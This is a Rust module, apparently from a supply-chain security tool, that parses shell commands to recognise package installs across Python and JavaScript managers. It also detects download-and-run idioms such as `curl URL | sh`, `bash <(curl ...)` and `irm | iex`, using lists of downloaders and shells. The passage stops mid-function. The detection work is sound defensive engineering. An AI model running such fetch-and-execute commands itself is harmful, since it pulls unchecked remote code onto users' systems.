//! Recognize package installs in a shell command (DESIGN.md section 9).
//!
//! Each simple command is unwrapped (`sudo`, `env FOO=1`, `timeout 60`, `bash -c '...'`),
//! matched against the package managers we know, and its arguments are parsed with that
//! tool's option table so option values are never mistaken for package names.

use std::path::{Path, PathBuf};
use std::sync::OnceLock;

use customs_scan::Ecosystem;
use regex::Regex;

use super::shell::{pipelines, split_commands};
use crate::util::normalize_name;

/// One thing an install command would fetch.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Target {
    /// A registry package. `version` is an exact version, a range, or a tag; `None` means
    /// whatever the registry calls latest.
    Package {
        ecosystem: Ecosystem,
        name: String,
        version: Option<String>,
    },
    /// Something Customs cannot check (URL, VCS, local path, custom index).
    Unverifiable {
        ecosystem: Ecosystem,
        spec: String,
        reason: String,
    },
    /// A script downloaded and run in one step (`curl ... | sh`, `bash <(curl ...)`,
    /// `irm ... | iex`). It never passes the registry proxy, so nothing checks it.
    RemoteScript { url: String, runner: String },
    /// Every package of the project in `dir`: what `npm install`, `npm ci` or `uv sync`
    /// fetch from its lockfile and manifest, or `pip install -e .[extras]` from its
    /// `pyproject.toml`. See [`super::project`].
    Project {
        manager: Manager,
        dir: PathBuf,
        extras: Vec<String>,
        /// Only what the manifest lists and the lockfile does not pin yet: `uv run` syncs
        /// the project before every command, and a dependency the agent just added is what
        /// it would fetch that nothing has checked (`uv sync` checks the whole lockfile).
        unlocked_only: bool,
    },
}

/// A package manager that installs whole projects.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Manager {
    Npm,
    Pnpm,
    Yarn,
    Bun,
    Uv,
    Poetry,
    Pipenv,
    /// `pip install .` and `-e .`: no lockfile, the dependencies `pyproject.toml` declares.
    Pip,
    Deno,
}

impl Manager {
    pub fn ecosystem(self) -> Ecosystem {
        match self {
            Manager::Npm | Manager::Pnpm | Manager::Yarn | Manager::Bun | Manager::Deno => {
                Ecosystem::Npm
            }
            Manager::Uv | Manager::Poetry | Manager::Pipenv | Manager::Pip => Ecosystem::Pypi,
        }
    }

    pub fn as_str(self) -> &'static str {
        match self {
            Manager::Npm => "npm",
            Manager::Pnpm => "pnpm",
            Manager::Yarn => "yarn",
            Manager::Bun => "bun",
            Manager::Uv => "uv",
            Manager::Poetry => "poetry",
            Manager::Pipenv => "pipenv",
            Manager::Pip => "pip",
            Manager::Deno => "deno",
        }
    }
}

fn project(manager: Manager, cwd: &Path, dir: Option<String>) -> Target {
    Target::Project {
        manager,
        dir: dir.map_or_else(|| cwd.to_path_buf(), |d| cwd.join(d)),
        extras: Vec::new(),
        unlocked_only: false,
    }
}

/// A local directory spec (`.`, `./lib`, `.[dev]`) that holds a `pyproject.toml`: pip
/// installs the dependencies it declares from the index.
fn local_project(cwd: &Path, spec: &str) -> Option<Target> {
    let (path, extras) = match spec.split_once('[') {
        Some((p, e)) => (p, e.trim_end_matches(']')),
        None => (spec, ""),
    };
    let dir = cwd.join(path.trim());
    dir.join("pyproject.toml")
        .is_file()
        .then(|| Target::Project {
            manager: Manager::Pip,
            dir,
            extras: extras
                .split(',')
                .map(|e| e.trim().to_string())
                .filter(|e| !e.is_empty())
                .collect(),
            unlocked_only: false,
        })
}

/// The value of the first option in `names` (`--cwd dir` or `--cwd=dir`).
fn opt_value(args: &[String], names: &[&str]) -> Option<String> {
    let mut it = args.iter();
    while let Some(a) = it.next() {
        if a == "--" {
            break;
        }
        if names.contains(&a.as_str()) {
            return it.next().cloned();
        }
        if let Some((k, v)) = a.split_once('=') {
            if names.contains(&k) {
                return Some(v.to_string());
            }
        }
    }
    None
}

/// Whether `args` hold anything besides options and their values.
fn has_positional(args: &[String], with_value: &[&str]) -> bool {
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        if a == "--" {
            return i + 1 < args.len();
        }
        if !a.starts_with('-') {
            return true;
        }
        i += if with_value.contains(&a) || a == "--registry" {
            2
        } else {
            1
        };
    }
    false
}

/// An install command found in the input.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Install {
    /// The command as recognized, e.g. `pip install`, `npx`.
    pub tool: String,
    pub targets: Vec<Target>,
}

fn basename(w: &str) -> &str {
    w.rsplit(['/', '\\']).next().unwrap_or(w)
}

fn is_assignment(w: &str) -> bool {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"^[A-Za-z_][A-Za-z0-9_]*=").unwrap())
        .is_match(w)
}

/// Parse every install in `cmd`. `cwd` resolves `-r requirements.txt`.
pub fn parse_command(cmd: &str, cwd: &Path) -> Vec<Install> {
    let mut out = Vec::new();
    for words in split_commands(cmd) {
        parse_simple(&words, cwd, &mut out, 0);
    }
    let mut scripts = Vec::new();
    remote_scripts(cmd, &mut scripts, 0);
    for (url, runner, tool) in scripts {
        out.push(Install {
            tool,
            targets: vec![Target::RemoteScript { url, runner }],
        });
    }
    out
}

/// Commands that print a downloaded file to standard output (curl, wget -O-, and the
/// PowerShell web cmdlets and their aliases). Lower case.
const DOWNLOADERS: [&str; 7] = [
    "curl",
    "wget",
    "fetch",
    "iwr",
    "irm",
    "invoke-webrequest",
    "invoke-restmethod",
];

fn is_downloader(word: &str) -> bool {
    let w = basename(word).to_ascii_lowercase();
    DOWNLOADERS.contains(&w.trim_end_matches(".exe"))
}

/// Shells, which run a script read from standard input unless given `-c`.
const SHELLS: [&str; 7] = ["sh", "bash", "zsh", "dash", "ksh", "ash", "fish"];
/// Interpreters that run a script from standard input only with no argument or `-`.
const INTERPRETERS: [&str; 9] = [
    "python",
    "python2",
    "python3",
    "node",
    "perl",
    "ruby",
    "php",
    "pwsh",
    "powershell",
];

/// Strip wrappers (`sudo -E`, `env FOO=1`, `doas`, `nohup`, `command`, `exec`) and
/// leading assignments.
fn unwrap_runner(mut w: &[String]) -> &[String] {
    loop {
        while w.first().is_some_and(|x| is_assignment(x)) {
            w = &w[1..];
        }
        match w.first().map(|x| basename(x)) {
            Some("sudo" | "doas") => {
                w = skip_opts(&w[1..], &["-u", "-g", "-h", "-p", "-C", "-U", "-r", "-t"])
            }
            Some("env") => w = skip_opts(&w[1..], &["-u", "-C", "-S"]),
            Some("nohup" | "command" | "exec" | "time") => w = &w[1..],
            _ => return w,
        }
    }
}

/// The runner when `words` would run a script read from standard input.
fn stdin_runner(words: &[String]) -> Option<String> {
    let w = unwrap_runner(words);
    let first = w.first()?;
    let name = basename(first).trim_end_matches(".exe");
    let lower = name.to_ascii_lowercase();
    let args = &w[1..];
    if SHELLS.contains(&lower.as_str()) {
        return (!args.iter().any(|a| a == "-c")).then(|| name.to_string());
    }
    let version = lower.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    if INTERPRETERS.contains(&lower.as_str()) || INTERPRETERS.contains(&version) {
        return (args.is_empty() || args.iter().all(|a| a == "-")).then(|| name.to_string());
    }
    if lower == "uv" && args.first().is_some_and(|a| a == "run") {
        // `uv run -` and `uv run python [-]` read the script from stdin.
        let (_, at) = uv_run_command(&args[1..]);
        let cmd = &args[1 + at.min(args.len() - 1)..];
        let from_stdin = match cmd {
            [c] => c == "-" || is_python(c),
            [c, d] => is_python(c) && d == "-",
            _ => false,
        };
        return (at < args.len() - 1 && from_stdin).then(|| "uv run".to_string());
    }
    matches!(lower.as_str(), "iex" | "invoke-expression").then(|| name.to_string())
}

fn is_python(w: &str) -> bool {
    let b = basename(w).to_ascii_lowercase();
    b.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.') == "python"
}

/// The URL a downloader command fetches: its first `http(s)://` argument, else its first
/// argument that is not an option.
fn download_url(words: &[String]) -> String {
    let args = &words[1..];
    args.iter()
        .find(|a| {
            let l = a.to_ascii_lowercase();
            l.starts_with("https://") || l.starts_with("http://")
        })
        .or_else(|| args.iter().find(|a| !a.starts_with('-')))
        .cloned()
        .unwrap_or_else(|| "an unknown URL".into())
}

/// The downloader commands of a substitution body (`curl -s URL` in `$(curl -s URL)`).
fn downloads_in(body: &str) -> Vec<String> {
    let p = pipelines(body);
    p.commands
        .iter()
        .map(|c| unwrap_runner(c))
        .filter(|c| c.first().is_some_and(|w| is_downloader(w)))
        .map(download_url)
        .collect()
}

/// The file a downloader command saves to: curl `-o FILE` (also `-sSLo FILE`,
/// `--output FILE`, `--output=FILE`) or `-O` (the URL's last path segment), wget `-O FILE`
/// or by default the URL's last segment, PowerShell `-OutFile FILE`. `None` when it writes
/// to standard output.
fn saved_file(c: &[String], url: &str) -> Option<String> {
    let tool = basename(&c[0]).to_ascii_lowercase();
    let tool = tool.trim_end_matches(".exe");
    let remote_name = || {
        url.split(['?', '#'])
            .next()
            .and_then(|u| u.rsplit('/').next())
            .filter(|n| !n.is_empty() && !n.contains(':'))
            .map(str::to_string)
    };
    let args = &c[1..];
    let mut out: Option<String> = None;
    let mut remote = false;
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        let next = args.get(i + 1).cloned();
        if let Some(v) = a
            .strip_prefix("--output=")
            .or_else(|| a.strip_prefix("--output-document="))
        {
            out = Some(v.to_string());
        } else if matches!(a, "--output" | "--output-document")
            || a.eq_ignore_ascii_case("-outfile")
        {
            out = next;
            i += 1;
        } else if a == "--remote-name" {
            remote = true;
        } else if tool == "curl" || tool == "wget" {
            if let Some(flags) = a
                .strip_prefix('-')
                .filter(|f| !f.is_empty() && !f.starts_with('-'))
            {
                let o = if tool == "wget" { 'O' } else { 'o' };
                if let Some(pos) = flags.find(o) {
                    let rest = &flags[pos + 1..];
                    if rest.is_empty() {
                        out = next;
                        i += 1;
                    } else {
                        out = Some(rest.to_string());
                    }
                } else if tool == "curl" && flags.contains('O') {
                    remote = true;
                }
            }
        }
        i += 1;
    }
    match out {
        Some(f) if f == "-" => None,
        Some(f) => Some(f),
        None if remote || tool == "wget" => remote_name(),
        None => None,
    }
}

/// The file `c` runs and what runs it: a shell, interpreter or `source` given a file, or a
/// path run directly (`exec`).
fn executed_file(c: &[String]) -> Option<(String, String)> {
    let first = c.first()?;
    let name = basename(first);
    let lower = name.to_ascii_lowercase();
    let version = lower.trim_end_matches(|ch: char| ch.is_ascii_digit() || ch == '.');
    if SHELLS.contains(&lower.as_str())
        || INTERPRETERS.contains(&lower.as_str())
        || INTERPRETERS.contains(&version)
        || matches!(name, "source" | ".")
    {
        let file = c[1..].iter().find(|a| !a.starts_with('-'))?;
        return Some((file.clone(), name.to_string()));
    }
    first
        .contains('/')
        .then(|| (first.clone(), "exec".to_string()))
}

fn plain_path(p: &str) -> &str {
    p.trim_start_matches("./")
}

/// Find scripts that `cmd` downloads and runs in one step, as `(url, runner, tool)`.
fn remote_scripts(cmd: &str, out: &mut Vec<(String, String, String)>, depth: usize) {
    if depth > 3 {
        return;
    }
    let p = pipelines(cmd);
    // `curl URL | ... | sh`: a downloader whose output reaches a runner in the pipeline.
    let mut start = 0;
    for i in 0..p.commands.len() {
        if p.piped.get(i).copied().unwrap_or(false) {
            continue;
        }
        let line = &p.commands[start..=i];
        start = i + 1;
        for (k, c) in line.iter().enumerate() {
            let c = unwrap_runner(c);
            if !c.first().is_some_and(|w| is_downloader(w)) {
                continue;
            }
            if let Some(runner) = line[k + 1..].iter().find_map(|r| stdin_runner(r)) {
                let tool = format!("{} | {runner}", basename(&c[0]));
                out.push((download_url(c), runner, tool));
                break;
            }
        }
    }
    for (i, words) in p.commands.iter().enumerate() {
        let w = unwrap_runner(words);
        let Some(first) = w.first() else { continue };
        let name = basename(first);
        let shell = SHELLS.contains(&name) || matches!(name, "source" | "." | "eval");
        if !shell {
            continue;
        }
        // `bash <(curl URL)`, `source <(wget -qO- URL)`.
        for (_, body) in p.process_subs.iter().filter(|(k, _)| *k == i) {
            for url in downloads_in(body) {
                out.push((url, name.to_string(), format!("{name} <(download)")));
            }
        }
        for (j, arg) in w.iter().enumerate().skip(1) {
            // `bash -c "$(curl URL)"`, `eval "$(curl URL)"`.
            let body = arg
                .strip_prefix("$(")
                .and_then(|b| b.strip_suffix(')'))
                .or_else(|| arg.strip_prefix('`').and_then(|b| b.strip_suffix('`')));
            if let Some(body) = body {
                for url in downloads_in(body) {
                    out.push((url, name.to_string(), format!("{name} $(download)")));
                }
            } else if j >= 2 && w[j - 1] == "-c" && SHELLS.contains(&name) {
                // A pipeline inside `bash -c '...'`.
                remote_scripts(arg, out, depth + 1);
            }
        }
    }
    // `curl -o x.sh URL && sh x.sh`: a file a downloader saved, run later in the line.
    let mut saved: Vec<(String, String, String)> = Vec::new();
    for (i, words) in p.commands.iter().enumerate() {
        let c = unwrap_runner(words);
        let Some(first) = c.first() else { continue };
        if is_downloader(first) {
            let url = download_url(c);
            let redirected = p
                .redirects
                .iter()
                .filter(|(k, _)| *k == i)
                .map(|(_, f)| f.clone())
                .next_back();
            if let Some(file) = saved_file(c, &url).or(redirected) {
                saved.push((
                    plain_path(&file).to_string(),
                    url,
                    basename(first).to_string(),
                ));
            }
            continue;
        }
        if let Some((file, runner)) = executed_file(c) {
            if let Some((_, url, tool)) = saved.iter().rev().find(|(f, ..)| f == plain_path(&file))
            {
                out.push((
                    url.clone(),
                    runner.clone(),
                    format!("{tool}, then {runner}"),
                ));
            }
        }
    }
}

/// Skip options of a wrapper command. `with_value` lists options that take an argument.
fn skip_opts<'a>(mut w: &'a [String], with_value: &[&str]) -> &'a [String] {
    while let Some(first) = w.first() {
        if first == "--" {
            return &w[1..];
        }
        if !first.starts_with('-') || first == "-" {
            break;
        }
        let takes = with_value.contains(&first.as_str());
        w = &w[if takes { 2.min(w.len()) } else { 1 }..];
    }
    w
}

fn parse_simple(words: &[String], cwd: &Path, out: &mut Vec<Install>, depth: usize) {
    if depth > 4 {
        return;
    }
    let mut w = words;
    loop {
        while w.first().is_some_and(|x| is_assignment(x)) {
            w = &w[1..];
        }
        let Some(first) = w.first() else { return };
        match basename(first) {
            "sudo" | "doas" => {
                w = skip_opts(
                    &w[1..],
                    &[
                        "-u", "-g", "-h", "-p", "-C", "-D", "-r", "-t", "-U", "-T", "--user",
                        "--group", "--chdir",
                    ],
                )
            }
            "env" => {
                w = skip_opts(
                    &w[1..],
                    &["-u", "-C", "--unset", "--chdir", "-S", "--split-string"],
                )
            }
            "time" | "nohup" | "exec" | "builtin" | "noglob" | "nocorrect" => {
                w = skip_opts(&w[1..], &[])
            }
            "command" => {
                if w.get(1).is_some_and(|a| a == "-v" || a == "-V") {
                    return;
                }
                w = skip_opts(&w[1..], &[])
            }
            "nice" => w = skip_opts(&w[1..], &["-n", "--adjustment"]),
            "stdbuf" => w = skip_opts(&w[1..], &["-i", "-o", "-e"]),
            "xargs" => w = skip_opts(&w[1..], &["-n", "-I", "-L", "-P", "-d", "-a", "-E", "-s"]),
            "timeout" => {
                w = skip_opts(&w[1..], &["-s", "-k", "--signal", "--kill-after"]);
                if !w.is_empty() {
                    w = &w[1..]; // the duration
                }
            }
            "{" | "!" | "then" | "do" | "else" | "if" | "while" | "until" => w = &w[1..],
            _ => break,
        }
    }
    let prog = basename(&w[0]).to_ascii_lowercase();
    let args = &w[1..];
    let prog = prog.strip_suffix(".exe").unwrap_or(&prog).to_string();

    // Shells and eval run their argument as a script.
    if matches!(
        prog.as_str(),
        "bash" | "sh" | "zsh" | "dash" | "ksh" | "fish"
    ) {
        let mut i = 0;
        while i < args.len() {
            let a = &args[i];
            if a.starts_with('-') && !a.starts_with("--") && a.contains('c') {
                if let Some(script) = args.get(i + 1) {
                    for cmd in split_commands(script) {
                        parse_simple(&cmd, cwd, out, depth + 1);
                    }
                }
                return;
            }
            if !a.starts_with('-') {
                return;
            }
            i += 1;
        }
        return;
    }
    if prog == "eval" {
        for cmd in split_commands(&args.join(" ")) {
            parse_simple(&cmd, cwd, out, depth + 1);
        }
        return;
    }

    static PIP: OnceLock<Regex> = OnceLock::new();
    static PYTHON: OnceLock<Regex> = OnceLock::new();
    let pip_re = PIP.get_or_init(|| Regex::new(r"^pip[0-9.]*$").unwrap());
    let python_re = PYTHON.get_or_init(|| Regex::new(r"^(python|pypy)[0-9.]*$|^py$").unwrap());

    if pip_re.is_match(&prog) {
        pip(args, cwd, out, "pip");
    } else if python_re.is_match(&prog) {
        // python [opts] -m pip|uv|pipx ...
        let mut i = 0;
        while i < args.len() {
            let a = args[i].as_str();
            let module = if a == "-m" {
                args.get(i + 1).map(|s| (s.as_str(), i + 2))
            } else {
                a.strip_prefix("-m")
                    .filter(|m| !m.is_empty())
                    .map(|m| (m, i + 1))
            };
            if let Some((m, rest)) = module {
                let rest = &args[rest.min(args.len())..];
                match m {
                    "pip" => pip(rest, cwd, out, "python -m pip"),
                    "uv" => uv(rest, cwd, out),
                    "pipx" => pipx(rest, cwd, out),
                    _ => {}
                }
                return;
            }
            if !a.starts_with('-') || a == "-c" {
                return; // running a script or inline code
            }
            i += if matches!(a, "-W" | "-X" | "-Q") {
                2
            } else {
                1
            };
        }
    } else {
        match prog.as_str() {
            "uv" => uv(args, cwd, out),
            "uvx" => tool_run(args, cwd, out, "uvx"),
            "poetry" => poetry(args, cwd, out),
            "pipenv" => pipenv(args, cwd, out),
            "pdm" => subcommand_install(args, &["add"], &["-p", "--project"], |rest| {
                out.push(Install {
                    tool: "pdm add".into(),
                    targets: pypi_args(rest, cwd),
                })
            }),
            "pipx" => pipx(args, cwd, out),
            "pixi" => pixi(args, cwd, out),
            "npm" => npm(args, cwd, out),
            "pnpm" => pnpm(args, cwd, out),
            "pnpx" => npx_like(args, out, "pnpx"),
            "yarn" => yarn(args, cwd, out),
            "bun" => bun(args, cwd, out),
            "bunx" => npx_like(args, out, "bunx"),
            "npx" => npx_like(args, out, "npx"),
            "deno" => deno(args, cwd, out),
            "dx" => deno_x(args, out, "dx"),
            _ => {}
        }
    }
}

/// Find the subcommand after global options; call `f` with its arguments when it is one
/// of `names`.
fn subcommand_install(
    args: &[String],
    names: &[&str],
    global_with_value: &[&str],
    f: impl FnOnce(&[String]),
) {
    let rest = skip_opts(args, global_with_value);
    if let Some((sub, rest)) = rest.split_first() {
        if names.contains(&sub.as_str()) {
            f(rest);
        }
    }
}

/// `pixi add` options that take a value.
const PIXI_ADD_VALUE: &[&str] = &[
    "--manifest-path",
    "-m",
    "--feature",
    "-f",
    "--platform",
    "-p",
    "--branch",
    "--tag",
    "--rev",
    "--subdir",
    "-s",
    "--git",
    "-g",
];

/// `pixi add --pypi SPEC...`; without `--pypi` the specs are conda packages, which
/// Customs does not cover.
fn pixi(args: &[String], cwd: &Path, out: &mut Vec<Install>) {
    let rest = skip_opts(args, &["--manifest-path", "-m"]);
    let Some((sub, rest)) = rest.split_first() else {
        return;
    };
    if sub != "add" || !rest.iter().any(|a| a == "--pypi") {
        return;
    }
    let mut specs = Vec::new();
    let mut git = None;
    let mut i = 0;
    while i < rest.len() {
        let a = rest[i].as_str();
        let (flag, inline) = a.split_once('=').map_or((a, None), |(f, v)| (f, Some(v)));
        if PIXI_ADD_VALUE.contains(&flag) {
            let value = inline.or_else(|| rest.get(i + 1).map(String::as_str));
            if matches!(flag, "--git" | "-g") {
                git = value;
            }
            i += if inline.is_some() { 1 } else { 2 };
            continue;
        }
        if !a.starts_with('-') {
            specs.push(rest[i].clone());
        }
        i += 1;
    }
    let targets = match git {
        Some(url) => vec![Target::Unverifiable {
            ecosystem: Ecosystem::Pypi,
            spec: url.to_string(),
            reason: "a PyPI package built from a git repository is not checked".into(),
        }],
        None => pypi_args(&specs, cwd),
    };
    out.push(Install {
        tool: "pixi add --pypi".into(),
        targets,
    });
}

const POETRY_GLOBAL_VALUE: &[&str] = &["-C", "--directory", "-P", "--project"];

fn poetry(args: &[String], cwd: &Path, out: &mut Vec<Install>) {
    let rest = skip_opts(args, POETRY_GLOBAL_VALUE);
    let Some((sub, rest)) = rest.split_first() else {
        return;
    };
    match sub.as_str() {
        "add" => out.push(Install {
            tool: "poetry add".into(),
            targets: pypi_args(rest, cwd),
        }),
        "install" | "sync" => out.push(Install {
            tool: format!("poetry {sub}"),
            targets: vec![project(
                Manager::Poetry,
                cwd,
                opt_value(args, &["-C", "--directory", "-P", "--project"]),
            )],
        }),
        _ => {}
    }
}

/// Options of `pipenv install` that take a value.
const PIPENV_VALUE: &[&str] = &["--python", "--categories", "--extra-pip-args"];

fn pipenv(args: &[String], cwd: &Path, out: &mut Vec<Install>) {
    let rest = skip_opts(args, &["--python"]);
    let Some((sub, rest)) = rest.split_first() else {
        return;
    };
    match sub.as_str() {
        "install" if has_positional(rest, PIPENV_VALUE) || opt_value(rest, &["-r"]).is_some() => {
            let rest: Vec<String> = strip_opts(rest, PIPENV_VALUE);
            out.push(Install {
                tool: "pipenv install".into(),
                targets: pypi_args(&rest, cwd),
            })
        }
        "install" | "sync" => out.push(Install {
            tool: format!("pipenv {sub}"),
            targets: vec![project(Manager::Pipenv, cwd, None)],
        }),
        _ => {}
    }
}

/// `args` without the options in `with_value` and their values.
fn strip_opts(args: &[String], with_value: &[&str]) -> Vec<String> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        let key = a.split_once('=').map_or(a, |(k, _)| k);
        if with_value.contains(&key) {
            i += if a.contains('=') { 1 } else { 2 };
            continue;
        }
        out.push(args[i].clone());
        i += 1;
    }
    out
}

const PIP_GLOBAL_VALUE: &[&str] = &[
    "--log",
    "--log-file",
    "--proxy",
    "--retries",
    "--timeout",
    "--exists-action",
    "--trusted-host",
    "--cert",
    "--client-cert",
    "--cache-dir",
    "--python",
    "--use-feature",
    "--use-deprecated",
];

fn pip(args: &[String], cwd: &Path, out: &mut Vec<Install>, tool: &str) {
    subcommand_install(
        args,
        &["install", "download", "wheel"],
        PIP_GLOBAL_VALUE,
        |rest| {
            out.push(Install {
                tool: format!("{tool} install"),
                targets: pypi_args(rest, cwd),
            })
        },
    );
}

const UV_GLOBAL_VALUE: &[&str] = &[
    "--directory",
    "--project",
    "--cache-dir",
    "--config-file",
    "--color",
    "--python-preference",
    "--python-fetch",
    "--allow-insecure-host",
];

fn uv(args: &[String], cwd: &Path, out: &mut Vec<Install>) {
    let rest = skip_opts(args, UV_GLOBAL_VALUE);
    let global = &args[..args.len() - rest.len()];
    let Some((sub, rest)) = rest.split_first() else {
        return;
    };
    match sub.as_str() {
        "pip" => {
            let rest = skip_opts(rest, UV_GLOBAL_VALUE);
            if let Some((cmd, rest)) = rest.split_first() {
                if cmd == "install" {
                    out.push(Install {
                        tool: "uv pip install".into(),
                        targets: pypi_args(rest, cwd),
                    });
                } else if cmd == "sync" {
                    // Positionals are requirements files.
                    let mut files = Vec::new();
                    for a in strip_opts(rest, PYPI_VALUE) {
                        if !a.starts_with('-') {
                            files.extend(["-r".to_string(), a]);
                        }
                    }
                    out.push(Install {
                        tool: "uv pip sync".into(),
                        targets: pypi_args(&files, cwd),
                    });
                }
            }
        }
        "add" => out.push(Install {
            tool: "uv add".into(),
            targets: pypi_args(rest, cwd),
        }),
        "sync" => out.push(Install {
            tool: "uv sync".into(),
            targets: vec![project(
                Manager::Uv,
                cwd,
                opt_value(args, &["--directory", "--project"]),
            )],
        }),
        "tool" => {
            if let Some((cmd, rest)) = rest.split_first() {
                match cmd.as_str() {
                    "install" => out.push(Install {
                        tool: "uv tool install".into(),
                        targets: pypi_args(rest, cwd),
                    }),
                    "run" => tool_run(rest, cwd, out, "uv tool run"),
                    _ => {}
                }
            }
        }
        "run" => {
            // `uv run --with pkg cmd` installs pkg into an ephemeral environment.
            let targets = with_specs(rest, cwd);
            if !targets.is_empty() {
                out.push(Install {
                    tool: "uv run --with".into(),
                    targets,
                });
            }
            let (forced, at) = uv_run_command(rest);
            let isolated = match rest.get(at) {
                Some(cmd) if cmd == "-" => true,
                Some(cmd) => run_script(cmd, forced, cwd, out, "uv run"),
                None => false,
            };
            let opts = &rest[..at.min(rest.len())];
            let no_sync = opts
                .iter()
                .any(|a| matches!(a.as_str(), "--no-sync" | "--no-project" | "--script" | "-s"));
            if !isolated && !no_sync {
                let dir = opt_value(opts, &["--directory", "--project"])
                    .or_else(|| opt_value(global, &["--directory", "--project"]));
                let mut target = project(Manager::Uv, cwd, dir);
                if let Target::Project { unlocked_only, .. } = &mut target {
                    *unlocked_only = true;
                }
                out.push(Install {
                    tool: "uv run".into(),
                    targets: vec![target],
                });
            }
        }
        _ => {}
    }
}

/// `uv run` options that take a value.
const UV_RUN_VALUE: &[&str] = &[
    "--with",
    "--with-editable",
    "--with-requirements",
    "--python",
    "-p",
    "--directory",
    "--project",
    "--package",
    "--extra",
    "--group",
    "--only-group",
    "--no-group",
    "--env-file",
    "--index",
    "--default-index",
    "--index-url",
    "--extra-index-url",
    "-i",
    "--find-links",
    "-f",
    "--index-strategy",
    "--keyring-provider",
    "--resolution",
    "--prerelease",
    "--exclude-newer",
    "--link-mode",
    "--cache-dir",
    "--config-file",
    "--config-setting",
    "-C",
    "--color",
    "--python-preference",
    "--refresh-package",
    "--reinstall-package",
    "--upgrade-package",
    "-P",
    "--no-build-package",
    "--no-binary-package",
    "--only-binary-package",
];

/// Whether `uv run` was given `--script`, and the index of its command in `args` (the
/// arguments after `run`; `args.len()` when there is none).
fn uv_run_command(args: &[String]) -> (bool, usize) {
    let mut forced = false;
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        if a == "--" {
            return (forced, i + 1);
        }
        if a == "--script" || a == "-s" {
            forced = true;
        } else if UV_RUN_VALUE.contains(&a) {
            i += 1;
        } else if a == "-" || !a.starts_with('-') {
            return (forced, i);
        }
        i += 1;
    }
    (forced, args.len())
}

/// The largest script read for inline metadata; the block sits at the top of real ones.
const MAX_SCRIPT_BYTES: u64 = 1 << 20;

/// `uv run` and `pipx run` with a script: a URL is fetched and run as is, and a local
/// `.py` file (or any file with `--script`) has its PEP 723 dependencies installed. True
/// when the script runs in its own environment (a URL, or a file with a metadata block)
/// rather than the project's.
fn run_script(cmd: &str, forced: bool, cwd: &Path, out: &mut Vec<Install>, tool: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    if lower.starts_with("https://") || lower.starts_with("http://") {
        out.push(Install {
            tool: tool.into(),
            targets: vec![Target::RemoteScript {
                url: cmd.to_string(),
                runner: tool.into(),
            }],
        });
        return true;
    }
    if !(forced || lower.ends_with(".py") || lower.ends_with(".pyw")) {
        return false;
    }
    let Some(targets) = script_metadata(&cwd.join(cmd)) else {
        return false;
    };
    if !targets.is_empty() {
        out.push(Install {
            tool: format!("{tool} {cmd}"),
            targets,
        });
    }
    true
}

/// The packages a script's PEP 723 `# /// script` block makes `uv run` or `pipx run`
/// install, with any index or `[tool.uv.sources]` entry it names reported as unverifiable.
/// `None` when the file cannot be read or has no block.
pub fn script_metadata(path: &Path) -> Option<Vec<Target>> {
    use std::io::Read;
    let mut text = String::new();
    std::fs::File::open(path)
        .ok()?
        .take(MAX_SCRIPT_BYTES)
        .read_to_string(&mut text)
        .ok()?;
    let mut lines = text.lines().skip_while(|l| l.trim_end() != "# /// script");
    lines.next()?;
    let mut body = String::new();
    for l in lines {
        if l.trim_end() == "# ///" {
            break;
        }
        let content = l.strip_prefix("# ").or_else(|| l.strip_prefix('#'))?;
        body.push_str(content);
        body.push('\n');
    }
    let meta: toml::Value = toml::from_str(&body).ok()?;
    let uv = meta.get("tool").and_then(|t| t.get("uv"));
    let sources = uv
        .and_then(|u| u.get("sources"))
        .and_then(toml::Value::as_table);
    let mut targets = Vec::new();
    for dep in meta
        .get("dependencies")
        .and_then(toml::Value::as_array)
        .into_iter()
        .flatten()
        .filter_map(toml::Value::as_str)
    {
        let t = parse_pypi_spec(dep);
        let from_source = match &t {
            Target::Package { name, .. } => sources.is_some_and(|s| {
                s.keys().any(|k| {
                    normalize_name(Ecosystem::Pypi, k) == normalize_name(Ecosystem::Pypi, name)
                })
            }),
            _ => false,
        };
        targets.push(if from_source {
            Target::Unverifiable {
                ecosystem: Ecosystem::Pypi,
                spec: dep.to_string(),
                reason: "the script installs it from a source in [tool.uv.sources], which Customs cannot check".into(),
            }
        } else {
            t
        });
    }
    let mut indexes: Vec<&str> = Vec::new();
    if let Some(uv) = uv {
        for key in ["index-url", "extra-index-url", "find-links"] {
            match uv.get(key) {
                Some(toml::Value::String(u)) => indexes.push(u),
                Some(toml::Value::Array(a)) => indexes.extend(a.iter().filter_map(|v| v.as_str())),
                _ => {}
            }
        }
        for idx in uv
            .get("index")
            .and_then(toml::Value::as_array)
            .into_iter()
            .flatten()
        {
            indexes.extend(idx.get("url").and_then(toml::Value::as_str));
        }
    }
    targets.extend(
        indexes
            .into_iter()
            .map(|u| custom_index(Ecosystem::Pypi, u)),
    );
    Some(targets)
}

/// `--with` values before the command of `uv run`.
fn with_specs(args: &[String], cwd: &Path) -> Vec<Target> {
    let mut targets = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let a = &args[i];
        if let Some(v) = a.strip_prefix("--with=") {
            targets.extend(split_with(v));
        } else if a == "--with" {
            if let Some(v) = args.get(i + 1) {
                targets.extend(split_with(v));
            }
            i += 1;
        } else if a == "--with-requirements" {
            if let Some(f) = args.get(i + 1) {
                targets.extend(requirements_file(&cwd.join(f), f, 0));
            }
            i += 1;
        } else if !a.starts_with('-') || a == "--" {
            break;
        }
        i += 1;
    }
    targets
}

fn split_with(v: &str) -> Vec<Target> {
    v.split(',')
        .filter(|s| !s.trim().is_empty())
        .map(|s| parse_pypi_spec(s.trim()))
        .collect()
}

/// `uvx` / `uv tool run`: `--from SPEC` names the package, otherwise the command does.
fn tool_run(args: &[String], cwd: &Path, out: &mut Vec<Install>, tool: &str) {
    const VALUE: &[&str] = &[
        "--python",
        "-p",
        "--index",
        "--default-index",
        "--index-url",
        "--extra-index-url",
        "--constraints",
        "-c",
        "--overrides",
        "--cache-dir",
        "--directory",
    ];
    let mut targets = Vec::new();
    let mut from = false;
